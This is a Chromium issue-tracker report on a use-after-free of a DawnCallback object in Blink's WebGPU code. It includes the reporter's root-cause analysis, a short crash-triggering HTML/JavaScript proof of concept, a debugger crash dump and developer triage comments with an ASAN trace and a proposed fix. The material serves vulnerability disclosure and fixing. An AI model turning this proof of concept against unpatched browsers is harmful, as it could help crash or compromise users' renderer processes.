# Security:  Blink - Use After Free of DawnCallback.

| Field | Value |
|-------|-------|
| **Issue ID** | [40056969](https://issues.chromium.org/issues/40056969) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGPU |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | en...@chromium.org |
| **Created** | 2021-08-23 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

Specifically crafted HTML file can cause Use After Free of DawnCallback object in Web GPU code. This bug may potentially be exploited to achieve one click remote code execution in renderer process.

```
GPUDevice owns 3 DawnCallback members, one of which is lost_callback_:  
   
  std::unique_ptr<DawnCallback<base::OnceCallback<void(const char\*)>>>  
	  lost_callback_;  

lost_callback_ is bound to GPUDevice::OnDeviceLostError to handle device lost:  

	  lost_callback_(BindDawnCallback(&GPUDevice::OnDeviceLostError,  
									  WrapWeakPersistent(this)))   

In GPUDevice::OnDeviceLostError(), lost_callback_ releases its ownership:  

	void GPUDevice::OnDeviceLostError(const char\* message) {  
	  lost_callback_.release();  
    
On the surface, lost_callback_ is unique_ptr and so the life cycle of the correspoding DawnCallback object is well managed.  



However, when GPUDevice is constructed, AsUserdata() exports the raw pointer and save it to the dawn device list:							    

  GetProcs().deviceSetDeviceLostCallback(GetHandle(),  
										 lost_callback_->UnboundCallback(),  
										 lost_callback_->AsUserdata());  
										   
When execution context is destroyed, DawnCallback::CallUnboundCallback (i.e. mDeviceLostCallback) would be executed and fed with mDeviceLostUserdata:  

	void Client::Disconnect() {  
		static_cast<Device\*>(device->value())->HandleDeviceLost("GPU connection lost")  
			mDeviceLostCallback(message, mDeviceLostUserdata)  
				DawnCallback<base::OnceCallback<void (const char \*)>>::CallUnboundCallback()  

In DawnCallback::CallUnboundCallback(), the DawnCallback object is reconstructed from the user data:  
			  
  static R CallUnboundCallback(Args... args, void\* handle) {  
	auto callback =  
		std::unique_ptr<DawnCallback>(DawnCallback::FromUserdata(handle));  
	return std::move(\*callback).Run(std::forward<Args>(args)...);  
  }  


On the other hand, if GC is triggered, destruction of GPUDevice and its lost_callback_ unique_ptr would cause free of the underlying DawnCallback. This is independent of the obave stated device lost callback process because mDeviceLostUserdata is stored as raw pointer independently.   

If the GC and destrution of GPUDevice happens before the obave stated device lost callback process, the execution of DawnCallback::CallUnboundCallback() would lead to function call against a freed DawnCallback object.  

	  
An ASAN report is also attached for your easy assessment.  

```

**VERSION**  

Google Chrome 94.0.4606.12 (Official Build) dev (64-bit) (cohort: Dev)  

Revision 20ec91dd819beb096f5d9b1faf6b2ad4f3f373ff-refs/branch-heads/4606@{#121}  

OS Windows 10 OS Version 2009 (Build 19043.1165)  

JavaScript V8 9.4.146.8

**REPRODUCTION CASE** ( UAF\_DawnCallback\_PoC.html )  

<script>  

navigator.gpu.requestAdapter().then((adapter)=>{adapter.requestDevice().then((val)=>{});});  

setTimeout(function(){ location.reload();},Math.random()\*500);  

</script>

STEPS TO REPRODUCE  

1) Run Chrome with option " --enable-features=WebGPUService --enable-blink-features=WebGPU ".(It does not need any command line option in production because the WebGPU feature is in origin trial)  

2) Open the PoC ( UAF\_DawnCallback\_PoC.html ) in Chrome.  

3) Chrome crashes due to memory corruption caused by Use After Free of a DawnCallback object.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
(11f4.11e0): Access violation - code c0000005 (!!! second chance !!!)  
chrome!base::OnceCallback<void (const char \*)>::Run+0x12 [inlined in chrome!blink::DawnCallback<base::OnceCallback<void (const char \*)> >::CallUnboundCallback+0x2d]:  
00007ffa`7005506d ff5108          call    qword ptr [rcx+8] ds:f0d8c300`b2190008=????????????????  
9:171> r  
rax=000012a6d40e0c32 rbx=000019b201278df0 rcx=f0d8c300b2190000  
rdx=00007ffa7169ed66 rsi=000019b200c3cf70 rdi=000000afe7bfd258  
rip=00007ffa7005506d rsp=000000afe7bfd230 rbp=00001dbb0064c670  
 r8=000019b200c3cf70  r9=000000007ffeb000 r10=00000000546c6148  
r11=fffffffff9d6a3db r12=00001dbb003d9418 r13=0000000000000003  
r14=00007ffa7169ed66 r15=00001dbb003a8e28  
iopl=0         nv up ei pl nz na pe nc  
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
chrome!base::OnceCallback<void (const char \*)>::Run+0x12 [inlined in chrome!blink::DawnCallback<base::OnceCallback<void (const char \*)> >::CallUnboundCallback+0x2d]:  
00007ffa`7005506d ff5108          call    qword ptr [rcx+8] ds:f0d8c300`b2190008=????????????????  
9:171> dv  
		   this = 0x000019b2`00c3cf70  
		   args = 0x00007ffa`7169ed66 "GPU connection lost"  
			 cb = class base::OnceCallback<void (const char \*)>  
			  f = <value unavailable>  
9:171> k  
 # Child-SP          RetAddr           Call Site  
00 (Inline Function) --------`-------- chrome!base::OnceCallback<void (const char \*)>::Run+0x12 [C:\b\s\w\ir\cache\builder\src\base\callback.h @ 98]   
01 (Inline Function) --------`-------- chrome!blink::DawnCallback<base::OnceCallback<void (const char \*)> >::Run+0x12 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webgpu\dawn_callback.h @ 49]   
02 000000af`e7bfd230 00007ffa`6e706dab chrome!blink::DawnCallback<base::OnceCallback<void (const char \*)> >::CallUnboundCallback+0x2d [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\modules\webgpu\dawn_callback.h @ 62]   
03 000000af`e7bfd280 00007ffa`6bfd553e chrome!dawn_wire::client::Client::Disconnect+0x8b [C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn_wire\client\Client.cpp @ 141]   
04 (Inline Function) --------`-------- chrome!dawn_wire::WireClient::Disconnect+0xc [C:\b\s\w\ir\cache\builder\src\third_party\dawn\src\dawn_wire\WireClient.cpp @ 57]   
05 (Inline Function) --------`-------- chrome!gpu::webgpu::DawnWireServices::Disconnect+0xf [C:\b\s\w\ir\cache\builder\src\gpu\command_buffer\client\webgpu_implementation.cc @ 58]   
06 000000af`e7bfd2e0 00007ffa`6cd198aa chrome!blink::DawnControlClientHolder::Destroy+0x2e [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\graphics\gpu\dawn_control_client_holder.cc @ 41]   
07 000000af`e7bfd350 00007ffa`6847d45b chrome!blink::ContextLifecycleObserver::NotifyContextDestroyed+0x4a [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\context_lifecycle_observer.cc @ 47]   
08 (Inline Function) --------`-------- chrome!blink::ContextLifecycleNotifier::NotifyContextDestroyed::<lambda_0>::operator()+0x5 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\context_lifecycle_notifier.cc @ 31]   
09 (Inline Function) --------`-------- chrome!blink::HeapObserverSet<blink::ContextLifecycleObserver>::ForEachObserver+0x5c [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\heap_observer_set.h @ 68]   
0a 000000af`e7bfd380 00007ffa`6847d331 chrome!blink::ContextLifecycleNotifier::NotifyContextDestroyed+0x6b [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\context_lifecycle_notifier.cc @ 30]   
0b (Inline Function) --------`-------- chrome!blink::ExecutionContext::NotifyContextDestroyed+0x13 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\execution_context\execution_context.cc @ 180]   
0c 000000af`e7bfd3e0 00007ffa`6847d21d chrome!blink::LocalDOMWindow::FrameDestroyed+0x51 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\local_dom_window.cc @ 840]   
0d 000000af`e7bfd410 00007ffa`681257ca chrome!blink::LocalDOMWindow::Reset+0xd [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\local_dom_window.cc @ 854]   
0e 000000af`e7bfd440 00007ffa`6c8bfbad chrome!blink::LocalFrame::SetDOMWindow+0x1a [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\local_frame.cc @ 799]   
0f (Inline Function) --------`-------- chrome!blink::DocumentLoader::InitializeWindow+0x675 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\document_loader.cc @ 2121]   
10 000000af`e7bfd480 00007ffa`687780cf chrome!blink::DocumentLoader::CommitNavigation+0x76d [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\document_loader.cc @ 2233]   
11 000000af`e7bfd790 00007ffa`69c77c45 chrome!blink::FrameLoader::CommitDocumentLoader+0x11f [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\frame_loader.cc @ 1217]   
12 000000af`e7bfd860 00007ffa`6b21cddb chrome!blink::FrameLoader::CommitNavigation+0x9d5 [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\loader\frame_loader.cc @ 1059]   
13 000000af`e7bfda80 00007ffa`6b22b606 chrome!blink::WebLocalFrameImpl::CommitNavigation+0xdb [C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\web_local_frame_impl.cc @ 2340]   
14 000000af`e7bfdb60 00007ffa`6b23647f chrome!content::RenderFrameImpl::CommitNavigationWithParams+0x686 [C:\b\s\w\ir\cache\builder\src\content\renderer\render_frame_impl.cc @ 2944]   
15 (Inline Function) --------`-------- chrome!base::internal::FunctorTraits<void (content::RenderFrameImpl::\*)(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__1::unique_ptr<blink::PendingURLLoaderFactoryBundle,std::__1::default_delete<blink::PendingURLLoaderFactoryBundle> >, absl::optional<std::__1::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>,std::__1::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader> > > >, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__1::unique_ptr<content::DocumentState,std::__1::default_delete<content::DocumentState> >, std::__1::unique_ptr<blink::WebNavigationParams,std::__1::default_delete<blink::WebNavigationParams> >),void>::Invoke+0x1b8 [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 509]   
16 (Inline Function) --------`-------- chrome!base::internal::InvokeHelper<1,void>::MakeItSo+0x1e0 [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 668]   
17 (Inline Function) --------`-------- chrome!base::internal::Invoker<base::internal::BindState<void (content::RenderFrameImpl::\*)(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__1::unique_ptr<blink::PendingURLLoaderFactoryBundle,std::__1::default_delete<blink::PendingURLLoaderFactoryBundle> >, absl::optional<std::__1::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>,std::__1::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader> > > >, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__1::unique_ptr<content::DocumentState,std::__1::default_delete<content::DocumentState> >, std::__1::unique_ptr<blink::WebNavigationParams,std::__1::default_delete<blink::WebNavigationParams> >),base::WeakPtr<content::RenderFrameImpl>,mojo::StructPtr<blink::mojom::CommonNavigationParams>,mojo::StructPtr<blink::mojom::CommitNavigationParams>,std::__1::unique_ptr<blink::PendingURLLoaderFactoryBundle,std::__1::default_delete<blink::PendingURLLoaderFactoryBundle> >,absl::optional<std::__1::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>,std::__1::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader> > > >,mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>,mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>,mojo::PendingRemote<network::mojom::URLLoaderFactory>,mojo::PendingRemote<blink::mojom::CodeCacheHost>,mojo::StructPtr<content::mojom::CookieManagerInfo>,mojo::StructPtr<content::mojom::StorageInfo>,std::__1::unique_ptr<content::DocumentState,std::__1::default_delete<content::DocumentState> > >,void (std::__1::unique_ptr<blink::WebNavigationParams,std::__1::default_delete<blink::WebNavigationParams> >)>::RunImpl+0x1e0 [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 721]   
18 000000af`e7bfdcb0 00007ffa`6b22a07e chrome!base::internal::Invoker<base::internal::BindState<void (content::RenderFrameImpl::\*)(mojo::StructPtr<blink::mojom::CommonNavigationParams>, mojo::StructPtr<blink::mojom::CommitNavigationParams>, std::__1::unique_ptr<blink::PendingURLLoaderFactoryBundle,std::__1::default_delete<blink::PendingURLLoaderFactoryBundle> >, absl::optional<std::__1::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>,std::__1::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader> > > >, mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>, mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>, mojo::PendingRemote<network::mojom::URLLoaderFactory>, mojo::PendingRemote<blink::mojom::CodeCacheHost>, mojo::StructPtr<content::mojom::CookieManagerInfo>, mojo::StructPtr<content::mojom::StorageInfo>, std::__1::unique_ptr<content::DocumentState,std::__1::default_delete<content::DocumentState> >, std::__1::unique_ptr<blink::WebNavigationParams,std::__1::default_delete<blink::WebNavigationParams> >),base::WeakPtr<content::RenderFrameImpl>,mojo::StructPtr<blink::mojom::CommonNavigationParams>,mojo::StructPtr<blink::mojom::CommitNavigationParams>,std::__1::unique_ptr<blink::PendingURLLoaderFactoryBundle,std::__1::default_delete<blink::PendingURLLoaderFactoryBundle> >,absl::optional<std::__1::vector<mojo::StructPtr<blink::mojom::TransferrableURLLoader>,std::__1::allocator<mojo::StructPtr<blink::mojom::TransferrableURLLoader> > > >,mojo::StructPtr<blink::mojom::ControllerServiceWorkerInfo>,mojo::StructPtr<blink::mojom::ServiceWorkerContainerInfoForClient>,mojo::PendingRemote<network::mojom::URLLoaderFactory>,mojo::PendingRemote<blink::mojom::CodeCacheHost>,mojo::StructPtr<content::mojom::CookieManagerInfo>,mojo::StructPtr<content::mojom::StorageInfo>,std::__1::unique_ptr<content::DocumentState,std::__1::default_delete<content::DocumentState> > >,void (std::__1::unique_ptr<blink::WebNavigationParams,std::__1::default_delete<blink::WebNavigationParams> >)>::RunOnce+0x20f [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 694]   
19 (Inline Function) --------`-------- chrome!base::OnceCallback<void (std::__1::unique_ptr<blink::WebNavigationParams,std::__1::default_delete<blink::WebNavigationParams> >)>::Run+0x18 [C:\b\s\w\ir\cache\builder\src\base\callback.h @ 98]   
1a 000000af`e7bfde00 00007ffa`6b4346a8 chrome!content::RenderFrameImpl::CommitNavigation+0x168e [C:\b\s\w\ir\cache\builder\src\content\renderer\render_frame_impl.cc @ 2802]   
1b 000000af`e7bfe1d0 00007ffa`68d4ee1e chrome!content::NavigationClient::CommitNavigation+0x2b8 [C:\b\s\w\ir\cache\builder\src\content\renderer\navigation_client.cc @ 56]   
1c 000000af`e7bfe360 00007ffa`68d4e02a chrome!content::mojom::NavigationClientStubDispatch::AcceptWithResponder+0xdae [C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\content\common\navigation_client.mojom.cc @ 1323]   
1d 000000af`e7bfe620 00007ffa`6c594fec chrome!content::mojom::NavigationClientStub<mojo::RawPtrImplRefTraits<content::mojom::NavigationClient> >::AcceptWithResponder+0x3a [C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\content\common\navigation_client.mojom.h @ 192]   
1e (Inline Function) --------`-------- chrome!mojo::InterfaceEndpointClient::HandleValidatedMessage+0x3c3 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 860]   
1f 000000af`e7bfe670 00007ffa`6c4c7eb9 chrome!mojo::InterfaceEndpointClient::HandleIncomingMessageThunk::Accept+0x3ec [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 329]   
20 000000af`e7bfe760 00007ffa`6cb75863 chrome!mojo::MessageDispatcher::Accept+0x69 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc @ 43]   
21 (Inline Function) --------`-------- chrome!mojo::InterfaceEndpointClient::HandleIncomingMessage+0x23 [C:\b\s\w\ir\cache\builder\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc @ 655]   
22 (Inline Function) --------`-------- chrome!IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnEndpointThread+0xec [C:\b\s\w\ir\cache\builder\src\ipc\ipc_mojo_bootstrap.cc @ 981]   
23 (Inline Function) --------`-------- chrome!base::internal::FunctorTraits<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),void>::Invoke+0x1a2 [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 509]   
24 (Inline Function) --------`-------- chrome!base::internal::InvokeHelper<0,void>::MakeItSo+0x1aa [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 648]   
25 (Inline Function) --------`-------- chrome!base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunImpl+0x1ae [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 721]   
26 000000af`e7bfe7e0 00007ffa`67e34ef4 chrome!base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::\*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce+0x1d3 [C:\b\s\w\ir\cache\builder\src\base\bind_internal.h @ 690]   
27 (Inline Function) --------`-------- chrome!base::OnceCallback<void ()>::Run+0x16 [C:\b\s\w\ir\cache\builder\src\base\callback.h @ 98]   
28 000000af`e7bfea60 00007ffa`6c4537b7 chrome!base::TaskAnnotator::RunTask+0x1a4 [C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc @ 178]   
29 (Inline Function) --------`-------- chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl+0xf6 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 360]   
2a 000000af`e7bfebb0 00007ffa`69b31689 chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork+0x187 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 260]   
2b 000000af`e7bfef40 00007ffa`685e3643 chrome!base::MessagePumpDefault::Run+0x99 [C:\b\s\w\ir\cache\builder\src\base\message_loop\message_pump_default.cc @ 41]   
2c 000000af`e7bfeff0 00007ffa`687787b6 chrome!base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run+0x83 [C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc @ 470]   
2d 000000af`e7bff060 00007ffa`68a4f427 chrome!base::RunLoop::Run+0x1a6 [C:\b\s\w\ir\cache\builder\src\base\run_loop.cc @ 136]   
2e 000000af`e7bff170 00007ffa`6ad57bf0 chrome!content::RendererMain+0x2c7 [C:\b\s\w\ir\cache\builder\src\content\renderer\renderer_main.cc @ 266]   
2f (Inline Function) --------`-------- chrome!content::RunOtherNamedProcessTypeMain+0xbd [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 637]   
30 000000af`e7bff320 00007ffa`6995dab3 chrome!content::ContentMainRunnerImpl::Run+0x1c0 [C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc @ 974]   
31 (Inline Function) --------`-------- chrome!content::RunContentProcess+0x3e [C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc @ 390]   
32 000000af`e7bff3f0 00007ffa`6a7d1712 chrome!content::ContentMain+0x73 [C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc @ 418]   
33 000000af`e7bff5e0 00007ff7`8e721ec0 chrome!ChromeMain+0x1a2 [C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc @ 175]   
34 000000af`e7bff6f0 00007ff7`8e721a5f chrome_exe!MainDllLoader::Launch+0x300 [C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc @ 169]   
35 000000af`e7bff970 00007ff7`8e782d22 chrome_exe!wWinMain+0xcaf [C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc @ 382]   
36 (Inline Function) --------`-------- chrome_exe!invoke_main+0x21 [d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 118]   
37 000000af`e7bffda0 00007ffa`c5ec7034 chrome_exe!__scrt_common_main_seh+0x106 [d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288]   
38 000000af`e7bffde0 00007ffa`c7c22651 KERNEL32!BaseThreadInitThunk+0x14  
39 000000af`e7bffe10 00000000`00000000 ntdll!RtlUserThreadStart+0x21  

```

## Attachments

- [UAF_DawnCallback_PoC.html](attachments/UAF_DawnCallback_PoC.html) (text/plain, 174 B)
- [UAF_DawnCallback_ASAN.txt](attachments/UAF_DawnCallback_ASAN.txt) (text/plain, 20.4 KB)
- [uaf-request-device-loop.html](attachments/uaf-request-device-loop.html) (text/plain, 1.1 KB)
- [ASAN_uaf_after_callbacks_set_to_null.txt](attachments/ASAN_uaf_after_callbacks_set_to_null.txt) (text/plain, 26.5 KB)

## Timeline

### [Deleted User] (2021-08-23)

[Empty comment from Monorail migration]

### dr...@chromium.org (2021-08-25)

I'm unable to reproduce this. My machine repeatedly logs:
  Warning: Couldn't open libvulkan.so.1
  Info: Couldn't load Vulkan

But I think that's probably related to my machine setup, so there may be a subset of users that can be impacted by this. Triaging to some WebGPU owners. cwallez@, kainino@ - can you take a look?

[Monorail components: Blink>WebGPU]

### [Deleted User] (2021-08-25)

[Empty comment from Monorail migration]

### cw...@chromium.org (2021-08-26)

Thank you for the report. FYI Austin and Brandon.

As a side note, looking at the code I found that we should free the dawn_wire::client::Device during the GPUDevice destructor instead of inside the DawnObject<Device> destructor because we could have popErrorScope or pipelineAsync calls in flight that will be cancelled, calling callbacks after they have been freed in the GPUDevice destructor. Similarly for other GPU object handling callbacks. I think we shouldn't magically release the handle in DawnObjectBase but instead provide a ReleaseHandle method and call that in each object's destructor (and assert in DawnObjectBase that it has been done). The issue could be reproduced with ASAN and garbage collecting objects before their callbacks are fired.

Opened up crbug.com/1243726 for this.

I'm still trying to understand how the device loss callback could be called after the blink::GPUDevice is freed because when it is freed, it should lose the only reference to the dawn_wire::client Device which would then get removed from the linked list of objects. Austin do you have an idea? I'll keep investigating in the meantime.

### cw...@chromium.org (2021-08-26)

Ah, it is because all the devices keep a ref to the dawn_wire::client Device instead of a Member<GPUDevice> so it outlives the GPUDevice.

### [Deleted User] (2021-08-26)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### en...@chromium.org (2021-08-26)

[Empty comment from Monorail migration]

### en...@chromium.org (2021-08-26)

This issue happens because there can be a period of time after ~GPUDevice destructor before the native WGPUDevice is deleted. If the WGPUDevice is not yet deleted, and we receive the ExecutionContext ContextDestroyed event, we will call the device lost callback which was previously owned by the GPUDevice and has now been freed.

To resolve this issue, Corentin and I discussed that in ~GPUDevice can deviceSetDeviceLostCallback (and also uncapturedErrorCallback and loggingCallback) to null. Inside the callback handler functions, dawn_wire::client::Device already checks that the callbacks are non-null before executing them.

This issue happens to be exclusive to GPUDevice because GPUDevice binds callbacks with WrapWeakPersistent. Other objects use WrapPersistent which means the Blink object will not be GC'ed until the callback has been called.
GPUDevice cannot use WrapPersistent because it would introduce an ownership cycle, making GPUDevice a GC root forever.

Talked with shrekshao@ who will look at clearing the callbacks to null inside ~GPUDevice.

### en...@chromium.org (2021-08-26)

[Empty comment from Monorail migration]

### en...@chromium.org (2021-08-26)

Here's another version of the same/similar crash that adds/removes iframes in a while loop instead of reloading the page.
It's a little more aggressive because it's operating on 10 iframes at once the probability of a crash is higher (at least that's what the intent of having 10 was).


I got a slightly different crash though.
The OP shows that finalization of GPUDevice during page finalization frees the callback object. and then dawn_wire::client::Client::Disconnect on context destroyed is what touches the callback object.
My crash shows that dawn_wire::client::Client::Disconnect is what calls frees the callback, and finalization of GPUDevice during page finalization is what touches the freed callback object.

I also got crash/16d3e67ba716286e running in Chrome Canary (much faster at crashing than an ASAN build, but still on the order of minutes).

In https://crbug.com/chromium/1242269#c4, Corentin says:
> I'm still trying to understand how the device loss callback could be called after the blink::GPUDevice is freed because when it is freed, it should lose the only reference to the dawn_wire::client Device which would then get removed from the linked list of objects.

Which I was also confused about because I didn't see how something could run BETWEEN ~GPUDevice and deletion of WGPUDevice since all other objects hold a Member<GPUDevice>.

The two different crash modes suggest that there's likely a race between the page finalization and execution of the ContextDestroyed lifecycle event. This explains how something can run between ~GPUDevice and deletion of WGPUDevice.
This isn't too surprising since we see that the finalization happens inside cppgc::internal::Sweeper::SweeperImpl::PerformSweepOnMutatorThread - so there's some other thread involved.


The OP's sweep stack looks slightly different though.
It's in blink::HeapObjectHeader::Finalize that ~GPUDevice happens. Mine happens inside cppgc::internal::`anonymous namespace'::SweepFinalizer::FinalizePage.

=================================================================
==8804==ERROR: AddressSanitizer: heap-use-after-free on address 0x1238c4485cb0 at pc 0x7ffe953b45a4 bp 0x00a78b7fe5d0 sp 0x00a78b7fe618
READ of size 8 at 0x1238c4485cb0 thread T0
    #0 0x7ffe953b45a3 in scoped_refptr<base::internal::BindStateBase>::~scoped_refptr C:\src\chromium\chromium\src\base\memory\scoped_refptr.h:224
    #1 0x7ffe953b45a3 in base::internal::CallbackBase::~CallbackBase(void) C:\src\chromium\chromium\src\base\callback_internal.cc:85:29
    #2 0x7ffeaae871cf in blink::DawnCallback<base::OnceCallback<void (const char *)> >::~DawnCallback C:\src\chromium\chromium\src\third_party\blink\renderer\modules\webgpu\dawn_callback.h:34
    #3 0x7ffeaae871cf in std::__1::default_delete<blink::DawnCallback<base::OnceCallback<void (const char *)> > >::operator() C:\src\chromium\chromium\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h:54
    #4 0x7ffeaae871cf in std::__1::unique_ptr<class blink::DawnCallback<class base::OnceCallback<(char const *)>>, struct std::__1::default_delete<class blink::DawnCallback<class base::OnceCallback<(char const *)>>>>::reset(class blink::DawnCallback<class base::OnceCallback<(char const *)>> *) C:\src\chromium\chromium\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h:315:7
    #5 0x7ffeaae8e70e in std::__1::unique_ptr<blink::DawnCallback<base::OnceCallback<void (const char *)> >,std::__1::default_delete<blink::DawnCallback<base::OnceCallback<void (const char *)> > > >::~unique_ptr C:\src\chromium\chromium\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h:269
    #6 0x7ffeaae8e70e in blink::GPUDevice::~GPUDevice(void) C:\src\chromium\chromium\src\third_party\blink\renderer\modules\webgpu\gpu_device.h:57:7
    #7 0x7ffeaae7e648 in blink::GPUDevice::`scalar deleting dtor'(unsigned int) C:\src\chromium\chromium\src\third_party\blink\renderer\modules\webgpu\gpu_device.h:57:7
    #8 0x7ffe91eb05d9 in cppgc::internal::`anonymous namespace'::SweepFinalizer::FinalizePage C:\src\chromium\chromium\src\v8\src\heap\cppgc\sweeper.cc:373:15
    #9 0x7ffe91ea9242 in cppgc::internal::`anonymous namespace'::SweepFinalizer::FinalizeSpaceWithDeadline C:\src\chromium\chromium\src\v8\src\heap\cppgc\sweeper.cc:354
    #10 0x7ffe91ea9242 in cppgc::internal::`anonymous namespace'::MutatorThreadSweeper::SweepWithDeadline C:\src\chromium\chromium\src\v8\src\heap\cppgc\sweeper.cc:455
    #11 0x7ffe91ea9242 in cppgc::internal::Sweeper::SweeperImpl::PerformSweepOnMutatorThread(double, enum cppgc::internal::StatsCollector::ScopeId) C:\src\chromium\chromium\src\v8\src\heap\cppgc\sweeper.cc:824:34
    #12 0x7ffe8f843f77 in v8::internal::`anonymous namespace'::CollectCustomSpaceStatisticsAtLastGCTask::Run C:\src\chromium\chromium\src\v8\src\heap\cppgc-js\cpp-heap.cc:639:17
    #13 0x7ffe9561b74b in base::OnceCallback<void ()>::Run C:\src\chromium\chromium\src\base\callback.h:99
    #14 0x7ffe9561b74b in base::TaskAnnotator::RunTask(char const *, struct base::PendingTask *) C:\src\chromium\chromium\src\base\task\common\task_annotator.cc:178:33
    #15 0x7ffe98f99bef in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *) C:\src\chromium\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:360:23
    #16 0x7ffe98f98108 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork(void) C:\src\chromium\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:260:36
    #17 0x7ffe98f4e3c3 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\src\chromium\chromium\src\base\message_loop\message_pump_default.cc:39:55
